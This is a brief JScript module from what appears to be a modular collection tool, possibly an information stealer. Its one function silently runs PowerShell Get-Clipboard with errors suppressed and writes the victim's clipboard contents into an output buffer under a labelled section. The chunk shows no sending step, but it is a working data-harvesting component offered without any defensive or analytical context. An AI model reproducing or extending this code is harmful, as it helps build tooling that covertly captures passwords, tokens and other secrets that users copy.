// chunk: collectors/clipboard
// depends: core/emit_buffer, core/run_cmd
// provides: collect_clipboard
// format: jscript

function collect_clipboard() {
    emit("\r\n=== CLIPBOARD ===\r\n");
    emit(_run("powershell -Command \"Get-Clipboard 2>$null\""));
}
